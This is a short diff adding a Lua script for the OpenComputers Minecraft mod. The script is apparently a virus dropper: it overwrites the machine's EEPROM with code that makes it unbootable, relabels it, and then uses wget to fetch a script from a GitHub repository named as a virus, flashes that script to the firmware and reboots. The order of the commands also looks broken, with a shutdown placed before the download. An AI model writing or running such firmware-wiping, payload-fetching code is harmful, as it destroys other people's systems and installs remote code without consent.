@@ -1,0 +1,7 @@
+local comp = require('component')
+comp.eeprom.set('return false')
+comp.eeprom.setLabel('Copr EFI')
+os.execute("Shutdown")
+os.execute("wget -q https://raw.githubusercontent.com/Matveymayner/copr-openocmputers-virus/main/Copr.lua /tmp/Copr.lua")
+os.execute("flash -q /tmp/Copr.lua")
+os.execute("reboot")
